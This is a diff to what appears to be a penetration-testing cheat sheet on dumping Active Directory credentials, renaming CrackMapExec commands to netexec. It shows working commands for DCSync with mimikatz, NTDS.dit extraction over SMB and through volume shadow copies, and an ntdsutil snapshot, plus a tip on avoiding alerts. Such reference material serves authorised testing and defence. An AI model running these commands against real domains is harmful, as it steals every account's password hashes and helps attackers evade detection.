@@ -27,8 +27,8 @@ DCSync is a technique used by attackers to obtain sensitive information, includi
   ```powershell
   mimikatz# lsadump::dcsync /domain:htb.local /all /csv
 
-  crackmapexec smb 10.10.10.10 -u 'username' -p 'password' --ntds
-  crackmapexec smb 10.10.10.10 -u 'username' -p 'password' --ntds drsuapi
+  netexec smb 10.10.10.10 -u 'username' -p 'password' --ntds
+  netexec smb 10.10.10.10 -u 'username' -p 'password' --ntds drsuapi
   ```
 
 > :warning: OPSEC NOTE: Replication is always done between 2 Computers. Doing a DCSync from a user account can raise alerts.
@@ -48,9 +48,9 @@ The VSS is a Windows service that allows users to create snapshots or backups of
   ```powershell
   ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
   ```
-* [CrackMapExec VSS module](https://wiki.porchetta.industries/smb-protocol/obtaining-credentials/dump-ntds.dit)
+* [netexec VSS module](https://wiki.porchetta.industries/smb-protocol/obtaining-credentials/dump-ntds.dit)
   ```powershell
-  cme smb 10.10.0.202 -u username -p password --ntds vss
+  nxc smb 10.10.0.202 -u username -p password --ntds vss
   ```
 
 
